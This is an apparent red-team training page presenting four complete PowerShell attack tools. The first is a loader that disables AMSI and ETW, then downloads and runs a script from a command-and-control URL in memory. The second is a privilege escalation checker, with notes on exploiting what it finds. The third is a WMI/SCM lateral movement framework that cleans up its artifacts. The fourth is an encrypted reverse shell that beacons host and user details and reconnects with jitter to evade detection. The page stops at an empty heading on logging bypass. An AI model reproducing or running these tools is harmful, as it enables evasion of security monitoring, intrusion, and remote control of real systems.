---
layout: training-page
title: "PowerShell Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - powershell
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-powershell-offensive-tools"
render_with_liquid: false
---

# PowerShell Offensive Tools

PowerShell remains one of the most powerful post-exploitation platforms available on Windows. It ships with every modern Windows installation, integrates deeply with the .NET framework, and provides direct access to Win32 APIs through reflection and P/Invoke. This module covers four production-grade offensive tools: an in-memory module loader with AMSI/ETW bypass, a local privilege escalation checker, a WMI lateral movement framework, and an encrypted reverse shell.

---

## Background: Why PowerShell for Red Teams

PowerShell executes inside legitimate Windows processes (powershell.exe, pwsh.exe), generates logs that blend with normal administrative activity, and provides access to the full .NET ecosystem without dropping files to disk. Constrained Language Mode (CLM) and Script Block Logging are the primary defenses; AMSI is the runtime content inspection layer. Understanding how to work within and around these controls is essential for realistic red team operations.

Key concepts before reading these scripts:

- **AMSI (Antimalware Scan Interface):** A Windows API that allows security products to scan script content before execution. PowerShell calls AmsiScanBuffer on each script block.
- **ETW (Event Tracing for Windows):** A high-performance tracing framework. PowerShell writes execution events via EtwEventWrite in ntdll.dll.
- **Reflection:** The .NET mechanism for inspecting and invoking private/internal types and methods at runtime, which allows bypassing visibility restrictions.
- **Script Block Logging:** PowerShell feature (enabled by GPO) that logs all script block content to the Windows Event Log (Event ID 4104).

---

## Script 1: In-Memory PowerShell Module Loader with AMSI/ETW Bypass

This loader downloads a PowerShell script from a URL and executes it entirely in memory. It first disables AMSI by patching the internal initialization flag, then disables ETW by NOP-patching EtwEventWrite in ntdll.dll. Neither payload nor bypass code touches disk.

```powershell
#Requires -Version 5.1

<#
.SYNOPSIS
    Downloads and executes a PowerShell script in memory with AMSI and ETW bypass.

.DESCRIPTION
    Invoke-MemoryLoader performs three operations in sequence:
      1. Patches AmsiUtils.amsiInitFailed via reflection to disable AMSI scanning.
      2. NOP-patches EtwEventWrite in ntdll.dll via VirtualProtect to suppress ETW logging.
      3. Downloads the target script via WebClient and executes it in-process.

    All execution is in-memory. No files are written to disk.

.PARAMETER Url
    The URL of the PowerShell script to download and execute.

.PARAMETER Proxy
    Optional proxy URL (e.g., http://proxy.corp.local:8080).

.PARAMETER Credential
    Optional PSCredential for authenticated proxy or download endpoint.

.PARAMETER SkipTls
    If set, disables TLS certificate validation. Use only in controlled lab environments.

.EXAMPLE
    Invoke-MemoryLoader -Url 'http://192.168.1.100/payload.ps1' -SkipTls

.EXAMPLE
    $cred = Get-Credential
    Invoke-MemoryLoader -Url 'https://c2.example.com/stage2.ps1' -Credential $cred

.NOTES
    Author: Red Team Academy
    Requires: PowerShell 5.1 or later, Windows
    OPSEC: Generates PowerShell Event ID 4103/4104 if Script Block Logging is enabled
           before the bypass runs. Load this from a reflective launcher, not interactively.
#>

function Invoke-MemoryLoader {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [string]$Proxy,

        [System.Management.Automation.PSCredential]$Credential,

        [switch]$SkipTls
    )

    # -----------------------------------------------------------------------
    # Step 1: Patch AMSI — set amsiInitFailed = $true via reflection
    # -----------------------------------------------------------------------
    # AmsiUtils is an internal class in System.Management.Automation.
    # When amsiInitFailed is $true, AMSI scanning is skipped for the entire session.
    try {
        $amsiAssembly = [Ref].Assembly
        $amsiType     = $amsiAssembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiField    = $amsiType.GetField(
            'amsiInitFailed',
            [System.Reflection.BindingFlags]'NonPublic,Static'
        )
        $amsiField.SetValue($null, $true)
        Write-Verbose '[*] AMSI patched: amsiInitFailed = $true'
    }
    catch {
        Write-Warning "[-] AMSI patch failed: $_"
    }

    # -----------------------------------------------------------------------
    # Step 2: Patch ETW — NOP EtwEventWrite in ntdll.dll via VirtualProtect
    # -----------------------------------------------------------------------
    # EtwEventWrite is the kernel32/ntdll export called by the PowerShell ETW provider.
    # Overwriting the first 6 bytes with RET (0xC3) followed by NOPs (0x90) prevents
    # the function from writing any ETW events for the lifetime of this process.
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
'@
        $ntdll     = [EtwPatch]::GetModuleHandle('ntdll.dll')
        $etwAddr   = [EtwPatch]::GetProcAddress($ntdll, 'EtwEventWrite')

        if ($etwAddr -eq [IntPtr]::Zero) {
            throw 'Could not resolve EtwEventWrite'
        }

        # RET instruction (0xC3) followed by 5 NOPs (0x90)
        $patch      = [byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90, 0x90)
        $oldProtect = [uint32]0

        # Make the memory region writable (PAGE_EXECUTE_READWRITE = 0x40)
        $result = [EtwPatch]::VirtualProtect(
            $etwAddr,
            [UIntPtr]([uint32]$patch.Length),
            0x40,
            [ref]$oldProtect
        )

        if (-not $result) {
            throw 'VirtualProtect failed'
        }

        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, $patch.Length)

        # Restore original memory protection
        [EtwPatch]::VirtualProtect(
            $etwAddr,
            [UIntPtr]([uint32]$patch.Length),
            $oldProtect,
            [ref]$oldProtect
        ) | Out-Null

        Write-Verbose '[*] ETW patched: EtwEventWrite returns immediately'
    }
    catch {
        Write-Warning "[-] ETW patch failed: $_"
    }

    # -----------------------------------------------------------------------
    # Step 3: Configure WebClient with optional proxy, credential, TLS bypass
    # -----------------------------------------------------------------------
    $webClient = New-Object System.Net.WebClient

    if ($SkipTls) {
        # Disable certificate validation for the current AppDomain — lab use only
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        [System.Net.ServicePointManager]::SecurityProtocol =
            [System.Net.SecurityProtocolType]::Tls12 -bor
            [System.Net.SecurityProtocolType]::Tls11 -bor
            [System.Net.SecurityProtocolType]::Tls
        Write-Verbose '[*] TLS validation disabled'
    }

    if ($Proxy) {
        $proxyObj = New-Object System.Net.WebProxy($Proxy, $true)
        if ($Credential) {
            $proxyObj.Credentials = $Credential.GetNetworkCredential()
        }
        $webClient.Proxy = $proxyObj
        Write-Verbose "[*] Proxy set: $Proxy"
    }

    if ($Credential -and -not $Proxy) {
        $webClient.Credentials = $Credential.GetNetworkCredential()
    }

    # -----------------------------------------------------------------------
    # Step 4: Download and execute the payload in memory
    # -----------------------------------------------------------------------
    try {
        Write-Verbose "[*] Downloading: $Url"
        $code = $webClient.DownloadString($Url)

        if ([string]::IsNullOrWhiteSpace($code)) {
            throw 'Downloaded content is empty'
        }

        Write-Verbose "[*] Downloaded $($code.Length) characters. Executing in memory..."

        $scriptBlock = [ScriptBlock]::Create($code)
        $scriptBlock.Invoke()

        Write-Verbose '[*] Execution complete'
    }
    catch [System.Net.WebException] {
        Write-Error "[-] Download failed: $_"
    }
    catch {
        Write-Error "[-] Execution failed: $_"
    }
    finally {
        $webClient.Dispose()
    }
}
```

### Usage Notes

The AMSI patch uses `[Ref].Assembly` which resolves to `System.Management.Automation.dll` — the same assembly that contains `AmsiUtils`. This is a stable internal type path across PowerShell 5.x versions. On PowerShell 7, the assembly structure differs; verify field names against the specific runtime version. The ETW patch works by overwriting the prologue of `EtwEventWrite` with a RET instruction, which causes all callers (including the PowerShell ETW provider) to return immediately without logging.

---

## Script 2: Windows Local Privilege Escalation Checker

A comprehensive checker that enumerates common Windows privilege escalation vectors and returns structured results. Each finding is a `PSCustomObject` with Type, Path, Detail, and Severity fields, making it easy to pipe into reports or filter by severity.

```powershell
#Requires -Version 5.1

<#
.SYNOPSIS
    Enumerates common Windows local privilege escalation vectors.

.DESCRIPTION
    Invoke-PrivescCheck examines the local system for common privilege escalation
    opportunities including:
      - Unquoted service paths with spaces
      - Writable service binary paths (ACL check)
      - AlwaysInstallElevated registry keys (HKLM + HKCU)
      - Writable directories in the system %PATH%
      - Scheduled tasks whose binary paths are user-writable
      - Dangerous token privileges (SeImpersonatePrivilege, etc.)
      - DLL hijacking opportunities in writable PATH directories

    Returns an array of PSCustomObject findings sorted by severity.

.PARAMETER Severity
    Filter results to this minimum severity level: Low, Medium, High, Critical.
    Defaults to Low (all findings returned).

.EXAMPLE
    Invoke-PrivescCheck | Format-Table -AutoSize

.EXAMPLE
    Invoke-PrivescCheck -Severity High | Select-Object Type, Path, Detail

.NOTES
    Author: Red Team Academy
    Run as a standard user for realistic results. Some checks (scheduled tasks)
    may require elevated rights to enumerate fully.
#>

function Invoke-PrivescCheck {
    [CmdletBinding()]
    param(
        [ValidateSet('Low', 'Medium', 'High', 'Critical')]
        [string]$Severity = 'Low'
    )

    $findings   = [System.Collections.Generic.List[PSCustomObject]]::new()
    $severityMap = @{ Low = 0; Medium = 1; High = 2; Critical = 3 }
    $minSev     = $severityMap[$Severity]

    function Add-Finding {
        param($Type, $Path, $Detail, $Sev)
        if ($severityMap[$Sev] -ge $minSev) {
            $findings.Add([PSCustomObject]@{
                Type     = $Type
                Path     = $Path
                Detail   = $Detail
                Severity = $Sev
            })
        }
    }

    # ------------------------------------------------------------------
    # Check 1: Unquoted service paths containing spaces
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking unquoted service paths...'
    try {
        Get-WmiObject Win32_Service -ErrorAction Stop |
            Where-Object {
                $_.PathName -notmatch '^"'          -and
                $_.PathName -match ' '              -and
                $_.PathName -notmatch '^[A-Z]:\\Windows\\'
            } |
            ForEach-Object {
                Add-Finding `
                    -Type   'UnquotedServicePath' `
                    -Path   $_.PathName `
                    -Detail "Service: $($_.Name) | State: $($_.State) | StartMode: $($_.StartMode)" `
                    -Sev    'High'
            }
    }
    catch {
        Write-Warning "[-] Unquoted service path check failed: $_"
    }

    # ------------------------------------------------------------------
    # Check 2: Writable service binary paths (ACL enumeration)
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking writable service binaries...'
    try {
        Get-WmiObject Win32_Service -ErrorAction Stop |
            Where-Object { $_.PathName } |
            ForEach-Object {
                $svc = $_
                # Strip quotes and extract executable path before arguments
                $binPath = $svc.PathName -replace '"', ''
                if ($binPath -match '^(.+?\.exe)') {
                    $binPath = $Matches[1].Trim()
                }

                if (Test-Path $binPath -ErrorAction SilentlyContinue) {
                    try {
                        $acl = Get-Acl $binPath -ErrorAction Stop
                        $acl.Access |
                            Where-Object {
                                ($_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users') -and
                                ($_.FileSystemRights  -match 'Write|Modify|FullControl')
                            } |
                            ForEach-Object {
                                Add-Finding `
                                    -Type   'WritableServiceBinary' `
                                    -Path   $binPath `
                                    -Detail "Service: $($svc.Name) | Identity: $($_.IdentityReference) | Rights: $($_.FileSystemRights)" `
                                    -Sev    'Critical'
                            }
                    }
                    catch { }
                }
            }
    }
    catch {
        Write-Warning "[-] Writable service binary check failed: $_"
    }

    # ------------------------------------------------------------------
    # Check 3: AlwaysInstallElevated registry keys
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking AlwaysInstallElevated...'
    $aieHklm = (Get-ItemProperty `
        'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
        -Name AlwaysInstallElevated `
        -ErrorAction SilentlyContinue).AlwaysInstallElevated

    $aieHkcu = (Get-ItemProperty `
        'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
        -Name AlwaysInstallElevated `
        -ErrorAction SilentlyContinue).AlwaysInstallElevated

    if ($aieHklm -eq 1 -and $aieHkcu -eq 1) {
        Add-Finding `
            -Type   'AlwaysInstallElevated' `
            -Path   'HKLM+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' `
            -Detail 'Both HKLM and HKCU AlwaysInstallElevated = 1. Craft a malicious .msi to obtain SYSTEM.' `
            -Sev    'Critical'
    }
    elseif ($aieHklm -eq 1 -or $aieHkcu -eq 1) {
        Add-Finding `
            -Type   'AlwaysInstallElevated' `
            -Path   'HKLM or HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' `
            -Detail "Partial AIE config (HKLM=$aieHklm, HKCU=$aieHkcu). Both keys must be 1 to exploit." `
            -Sev    'Medium'
    }

    # ------------------------------------------------------------------
    # Check 4: Writable directories in %PATH%
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking writable PATH directories...'
    $env:PATH -split ';' |
        Where-Object { $_ -and (Test-Path $_ -ErrorAction SilentlyContinue) } |
        ForEach-Object {
            $dir = $_
            try {
                $testFile = Join-Path $dir ([System.IO.Path]::GetRandomFileName())
                [System.IO.File]::WriteAllText($testFile, 'rta_test')
                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                Add-Finding `
                    -Type   'WritablePATHDirectory' `
                    -Path   $dir `
                    -Detail 'Current user can write files here. Binary or DLL hijacking possible.' `
                    -Sev    'High'
            }
            catch { }
        }

    # ------------------------------------------------------------------
    # Check 5: Scheduled tasks with user-writable binary paths
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking scheduled task binaries...'
    try {
        Get-ScheduledTask -ErrorAction Stop |
            Where-Object { $_.Actions } |
            ForEach-Object {
                $task = $_
                $task.Actions |
                    Where-Object { $_.Execute } |
                    ForEach-Object {
                        $binPath = $_.Execute -replace '"', ''
                        if (Test-Path $binPath -ErrorAction SilentlyContinue) {
                            try {
                                $acl = Get-Acl $binPath -ErrorAction Stop
                                $acl.Access |
                                    Where-Object {
                                        ($_.IdentityReference -match 'Everyone|Users|Authenticated Users') -and
                                        ($_.FileSystemRights  -match 'Write|Modify|FullControl')
                                    } |
                                    ForEach-Object {
                                        Add-Finding `
                                            -Type   'WritableScheduledTaskBinary' `
                                            -Path   $binPath `
                                            -Detail "Task: $($task.TaskName) | RunAs: $($task.Principal.UserId) | Rights: $($_.FileSystemRights)" `
                                            -Sev    'High'
                                    }
                            }
                            catch { }
                        }
                    }
            }
    }
    catch {
        Write-Warning "[-] Scheduled task check requires task scheduler access."
    }

    # ------------------------------------------------------------------
    # Check 6: Token privileges — parse whoami /priv output
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking token privileges...'
    $dangerousPrivs = @(
        'SeImpersonatePrivilege',       # Potato attacks
        'SeAssignPrimaryTokenPrivilege',# Token substitution
        'SeTcbPrivilege',               # Act as OS
        'SeBackupPrivilege',            # Read any file
        'SeRestorePrivilege',           # Write any file
        'SeCreateTokenPrivilege',       # Create arbitrary tokens
        'SeLoadDriverPrivilege',        # Load kernel drivers
        'SeTakeOwnershipPrivilege',     # Take ownership of any object
        'SeDebugPrivilege'              # Debug and inject into any process
    )

    try {
        $privOutput = & whoami /priv 2>$null
        foreach ($priv in $dangerousPrivs) {
            $line = $privOutput | Where-Object { $_ -match $priv }
            if ($line) {
                $enabled = $line -match 'Enabled'
                $sev     = if ($enabled) { 'High' } else { 'Medium' }
                Add-Finding `
                    -Type   'DangerousTokenPrivilege' `
                    -Path   'Process Token' `
                    -Detail "$priv | Enabled: $enabled | Potato / token impersonation attacks may apply." `
                    -Sev    $sev
            }
        }
    }
    catch {
        Write-Warning "[-] whoami /priv parsing failed: $_"
    }

    # ------------------------------------------------------------------
    # Check 7: DLL hijacking — missing DLLs in writable PATH directories
    # ------------------------------------------------------------------
    Write-Verbose '[*] Checking DLL hijacking opportunities in PATH...'
    # Well-known DLLs that applications often load from PATH without an absolute path
    $knownMissingDlls = @(
        'wbemcomn.dll',
        'version.dll',
        'uxtheme.dll',
        'cryptbase.dll',
        'cryptsp.dll',
        'dbghelp.dll',
        'wininet.dll'
    )
    $pathDirs = $env:PATH -split ';' |
        Where-Object { Test-Path $_ -ErrorAction SilentlyContinue }

    foreach ($dll in $knownMissingDlls) {
        foreach ($dir in $pathDirs) {
            $dllPresent = Test-Path (Join-Path $dir $dll) -ErrorAction SilentlyContinue
            if (-not $dllPresent) {
                # Check if we can write here
                try {
                    $testFile = Join-Path $dir ([System.IO.Path]::GetRandomFileName())
                    [System.IO.File]::WriteAllText($testFile, 'rta_test')
                    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                    Add-Finding `
                        -Type   'DLLHijackingOpportunity' `
                        -Path   $dir `
                        -Detail "Missing '$dll' in writable PATH dir. Drop malicious DLL here to hijack loading." `
                        -Sev    'Medium'
                }
                catch { }
            }
        }
    }

    # Sort by severity descending and return
    $findings | Sort-Object @{
        Expression = { $severityMap[$_.Severity] }
        Descending = $true
    }
}
```

### Interpreting Results

Run `Invoke-PrivescCheck | Format-Table -AutoSize` for a quick overview. Filter critical findings with `| Where-Object Severity -eq 'Critical'`. The most commonly exploitable vectors in real assessments:

- **AlwaysInstallElevated (Critical):** Use `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi` then `msiexec /quiet /qn /i malicious.msi`.
- **WritableServiceBinary (Critical):** Replace the binary with your payload. Wait for or trigger a service restart.
- **SeImpersonatePrivilege (High):** GodPotato, PrintSpoofer, or RoguePotato to impersonate SYSTEM.

---

## Script 3: WMI Lateral Movement Framework

Supports three distinct lateral movement methods: WMI process creation, PSRemoting, and Service Control Manager (SCM). All methods include execution verification and artifact cleanup.

```powershell
#Requires -Version 5.1

<#
.SYNOPSIS
    Executes commands on remote hosts via WMI, PSRemoting, or SCM.

.DESCRIPTION
    Invoke-WmiLateral provides three lateral movement channels:

      WMI        Uses Win32_Process.Create. No WinRM required. Output goes to remote
                 filesystem (redirect to file in your command string).
      PSRemoting Uses Invoke-Command over WinRM/WSMan. Captures output directly.
      SCM        Creates a temporary Windows service, starts it, reads output via the
                 admin share (C$), then deletes the service for artifact cleanup.

    Execution is verified by querying the remote Win32_Process list for the spawned PID.

.PARAMETER ComputerName
    One or more target hostnames or IP addresses.

.PARAMETER Command
    The command string to execute on the remote system.

.PARAMETER Method
    Execution method: WMI (default), PSRemoting, or SCM.

.PARAMETER Credential
    PSCredential for authenticating to the remote host.

.EXAMPLE
    $cred = Get-Credential 'DOMAIN\Administrator'
    Invoke-WmiLateral -ComputerName 'WS01','WS02' -Command 'whoami > C:\out.txt' -Credential $cred

.EXAMPLE
    Invoke-WmiLateral -ComputerName 'DC01' -Command 'ipconfig /all' -Method PSRemoting -Credential $cred

.NOTES
    Author: Red Team Academy
    SCM method requires admin share (C$) access for output retrieval and artifact cleanup.
    WMI output does not return to caller — redirect to file on the remote host.
#>

function Invoke-WmiLateral {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$ComputerName,

        [Parameter(Mandatory)]
        [string]$Command,

        [ValidateSet('WMI', 'PSRemoting', 'SCM')]
        [string]$Method = 'WMI',

        [System.Management.Automation.PSCredential]$Credential
    )

    $results = [System.Collections.Generic.List[PSCustomObject]]::new()

    foreach ($target in $ComputerName) {
        Write-Verbose "[*] Targeting: $target via $Method"

        $result = [PSCustomObject]@{
            ComputerName = $target
            Method       = $Method
            PID          = $null
            Success      = $false
            Output       = ''
            Error        = ''
        }

        try {
            switch ($Method) {

                # -------------------------------------------------------
                # WMI: Win32_Process.Create — no WinRM required
                # -------------------------------------------------------
                'WMI' {
                    $wmiArgs = @{
                        Class        = 'Win32_Process'
                        Name         = 'Create'
                        ArgumentList = "cmd.exe /c $Command"
                        ComputerName = $target
                        ErrorAction  = 'Stop'
                    }
                    if ($Credential) { $wmiArgs['Credential'] = $Credential }

                    $wmiResult = Invoke-WmiMethod @wmiArgs

                    if ($wmiResult.ReturnValue -eq 0) {
                        $result.PID     = $wmiResult.ProcessId
                        $result.Success = $true
                        Write-Verbose "[+] WMI process created on $target | PID: $($result.PID)"

                        # Verify: query Win32_Process for the spawned PID
                        Start-Sleep -Milliseconds 1500
                        $procArgs = @{
                            Class        = 'Win32_Process'
                            Filter       = "ProcessId = $($result.PID)"
                            ComputerName = $target
                            ErrorAction  = 'SilentlyContinue'
                        }
                        if ($Credential) { $procArgs['Credential'] = $Credential }

                        $remoteProc = Get-WmiObject @procArgs
                        if ($remoteProc) {
                            Write-Verbose "[+] Process verified: $($remoteProc.Name) (PID $($result.PID))"
                        }
                        else {
                            Write-Verbose "[*] PID $($result.PID) no longer in list — likely exited"
                        }
                    }
                    else {
                        $result.Error = "WMI ReturnValue: $($wmiResult.ReturnValue)"
                    }
                }

                # -------------------------------------------------------
                # PSRemoting: Invoke-Command over WinRM
                # -------------------------------------------------------
                'PSRemoting' {
                    $invokeArgs = @{
                        ComputerName = $target
                        ScriptBlock  = [ScriptBlock]::Create($Command)
                        ErrorAction  = 'Stop'
                    }
                    if ($Credential) { $invokeArgs['Credential'] = $Credential }

                    $output = Invoke-Command @invokeArgs

                    $result.Success = $true
                    $result.Output  = $output -join "`n"
                    Write-Verbose "[+] PSRemoting succeeded on $target"
                }

                # -------------------------------------------------------
                # SCM: Create temp service, start, read output, cleanup
                # -------------------------------------------------------
                'SCM' {
                    $svcName = 'SVC' + [System.IO.Path]::GetRandomFileName().Replace('.','').Substring(0,6)
                    $outFile = "C:\Windows\Temp\$svcName.txt"
                    $svcBin  = "cmd.exe /c $Command > $outFile 2>&1"

                    if ($Credential) {
                        # Use PSRemoting as transport for sc.exe commands
                        $psArgs = @{
                            ComputerName = $target
                            Credential   = $Credential
                            ErrorAction  = 'Stop'
                        }

                        # Create the service
                        Invoke-Command @psArgs -ScriptBlock {
                            param($n, $b)
                            & sc.exe create $n binPath= $b start= demand obj= LocalSystem | Out-Null
                        } -ArgumentList $svcName, $svcBin

                        # Start it — it will run the command and exit
                        Invoke-Command @psArgs -ScriptBlock {
                            param($n)
                            & sc.exe start $n | Out-Null
                            Start-Sleep -Seconds 3
                        } -ArgumentList $svcName

                        # Read output file from remote host
                        $output = Invoke-Command @psArgs -ScriptBlock {
                            param($p)
                            if (Test-Path $p) { Get-Content $p -Raw }
                        } -ArgumentList $outFile

                        $result.Output  = $output
                        $result.Success = $true

                        # Cleanup: delete service and temp file
                        Invoke-Command @psArgs -ScriptBlock {
                            param($n, $p)
                            & sc.exe delete $n | Out-Null
                            Remove-Item $p -Force -ErrorAction SilentlyContinue
                        } -ArgumentList $svcName, $outFile

                        Write-Verbose "[+] SCM artifacts cleaned on $target"
                    }
                    else {
                        # Use sc.exe with UNC-style remote targeting
                        & sc.exe "\\$target" create $svcName binPath= $svcBin start= demand obj= LocalSystem 2>&1 | Out-Null
                        & sc.exe "\\$target" start  $svcName 2>&1 | Out-Null
                        Start-Sleep -Seconds 3

                        # Read output via admin share
                        $remoteOut = "\\$target\C`$\Windows\Temp\$svcName.txt"
                        if (Test-Path $remoteOut -ErrorAction SilentlyContinue) {
                            $result.Output  = Get-Content $remoteOut -Raw
                            $result.Success = $true
                        }

                        # Cleanup artifacts
                        & sc.exe "\\$target" delete $svcName 2>&1 | Out-Null
                        Remove-Item $remoteOut -Force -ErrorAction SilentlyContinue
                        Write-Verbose "[+] SCM artifacts cleaned on $target"
                    }
                }
            }
        }
        catch {
            $result.Error = $_.Exception.Message
            Write-Warning "[-] $target ($Method) failed: $_"
        }

        $results.Add($result)
    }

    return $results
}
```

---

## Script 4: Encrypted PowerShell Reverse Shell

AES-256-CBC encrypted reverse shell over TCP. Key derived from a pre-shared string via SHA-256. The shell reconnects automatically on disconnect with jitter to avoid timing-based detection. Commands are executed via `System.Diagnostics.Process` to capture both stdout and stderr.

```powershell
#Requires -Version 5.1

<#
.SYNOPSIS
    AES-256-CBC encrypted reverse shell over TCP with auto-reconnect.

.DESCRIPTION
    Invoke-EncryptedShell establishes an outbound TCP connection to a remote listener
    and provides an interactive shell. All traffic is encrypted with AES-256-CBC:

      - Key: SHA-256 hash of the pre-shared key string
      - IV:  Randomly generated per message, prepended to ciphertext
      - Framing: base64-encoded ciphertext newline-delimited over TCP

    The shell reconnects automatically on disconnect with jittered sleep intervals.
    Commands are run via System.Diagnostics.Process to capture stdout and stderr.

.PARAMETER RHost
    Remote listener IP address or hostname.

.PARAMETER RPort
    Remote listener TCP port (default: 4444).

.PARAMETER PSK
    Pre-shared key string. SHA-256 hash of this string becomes the AES-256 key.

.PARAMETER ReconnectDelay
    Base reconnect delay in seconds (default: 10). Actual delay is jittered ±30%.

.EXAMPLE
    Invoke-EncryptedShell -RHost 192.168.1.100 -RPort 4444 -PSK 'RedTeamAcademy2024'

.NOTES
    Author: Red Team Academy
    The listener must implement the matching AES-256-CBC protocol.
    Avoid passing PSK on the command line; use a variable:
        $psk = Read-Host -AsSecureString | ConvertFrom-SecureString
    For lab use — no persistence mechanism included.
#>

function Invoke-EncryptedShell {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$RHost,

        [int]$RPort = 4444,

        [Parameter(Mandatory)]
        [string]$PSK,

        [int]$ReconnectDelay = 10
    )

    # Derive AES-256 key: SHA-256(PSK)
    $sha256   = [System.Security.Cryptography.SHA256]::Create()
    $keyBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($PSK))
    $sha256.Dispose()

    function Invoke-Encrypt {
        param([string]$Plaintext, [byte[]]$Key)
        $aes           = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize   = 256
        $aes.BlockSize = 128
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key       = $Key
        $aes.GenerateIV()
        $iv            = $aes.IV

        $enc        = $aes.CreateEncryptor()
        $plain      = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
        $cipher     = $enc.TransformFinalBlock($plain, 0, $plain.Length)
        $enc.Dispose()
        $aes.Dispose()

        # IV (16 bytes) prepended to ciphertext, then base64-encoded
        return [System.Convert]::ToBase64String($iv + $cipher)
    }

    function Invoke-Decrypt {
        param([string]$CipherB64, [byte[]]$Key)
        $combined  = [System.Convert]::FromBase64String($CipherB64)
        $iv        = $combined[0..15]
        $cipher    = $combined[16..($combined.Length - 1)]

        $aes           = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize   = 256
        $aes.BlockSize = 128
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key       = $Key
        $aes.IV        = $iv

        $dec       = $aes.CreateDecryptor()
        $plain     = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
        $dec.Dispose()
        $aes.Dispose()

        return [System.Text.Encoding]::UTF8.GetString($plain)
    }

    function Invoke-CaptureCommand {
        param([string]$Cmd)
        try {
            $psi                        = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName               = 'cmd.exe'
            $psi.Arguments              = "/c $Cmd"
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError  = $true
            $psi.UseShellExecute        = $false
            $psi.CreateNoWindow         = $true
            $psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden

            $proc   = [System.Diagnostics.Process]::Start($psi)
            $stdout = $proc.StandardOutput.ReadToEnd()
            $stderr = $proc.StandardError.ReadToEnd()
            $proc.WaitForExit(15000) | Out-Null
            $exitCode = $proc.ExitCode
            $proc.Dispose()

            $out = $stdout
            if ($stderr) { $out += "`n[STDERR] $stderr" }
            if (-not $out) { $out = "[*] Command completed (exit: $exitCode)`n" }
            return $out
        }
        catch {
            return "[ERROR] Execution failed: $_`n"
        }
    }

    # Reconnect loop with ±30% jitter
    $attempt = 0
    while ($true) {
        $attempt++
        Write-Verbose "[*] Connection attempt $attempt -> ${RHost}:${RPort}"

        $tcpClient = $null
        $stream    = $null
        $reader    = $null
        $writer    = $null

        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($RHost, $RPort)
            $stream    = $tcpClient.GetStream()
            $reader    = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::ASCII)
            $writer    = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
            $writer.AutoFlush = $true

            Write-Verbose "[+] Connected to ${RHost}:${RPort}"

            # Send encrypted hello beacon with system info
            $helloText  = "HELLO|$env:COMPUTERNAME|$env:USERNAME|$env:USERDOMAIN|$(whoami)"
            $helloEnc   = Invoke-Encrypt -Plaintext $helloText -Key $keyBytes
            $writer.WriteLine($helloEnc)

            # Command receive/execute/respond loop
            while ($tcpClient.Connected) {
                try {
                    $encCmd = $reader.ReadLine()
                    if ($null -eq $encCmd -or $encCmd -eq '') { break }

                    $cmd = Invoke-Decrypt -CipherB64 $encCmd -Key $keyBytes

                    if ($cmd -ceq 'EXIT' -or $cmd -ceq 'quit') { return }

                    $cmdOutput  = Invoke-CaptureCommand -Cmd $cmd
                    $encOutput  = Invoke-Encrypt -Plaintext $cmdOutput -Key $keyBytes
                    $writer.WriteLine($encOutput)
                }
                catch {
                    Write-Verbose "[-] Loop error: $_"
                    break
                }
            }
        }
        catch {
            Write-Verbose "[-] Connection error: $_"
        }
        finally {
            if ($reader)    { try { $reader.Dispose()    } catch { } }
            if ($writer)    { try { $writer.Dispose()    } catch { } }
            if ($stream)    { try { $stream.Dispose()    } catch { } }
            if ($tcpClient) { try { $tcpClient.Dispose() } catch { } }
        }

        # Jittered sleep: base ± 30%
        $jitter = $ReconnectDelay * 0.3
        $sleep  = $ReconnectDelay + (Get-Random -Minimum ([int](-$jitter)) -Maximum ([int]$jitter))
        Write-Verbose "[*] Reconnecting in $sleep seconds..."
        Start-Sleep -Seconds $sleep
    }
}
```

---

## Operational Notes

### Script Block Logging Bypass Considerations

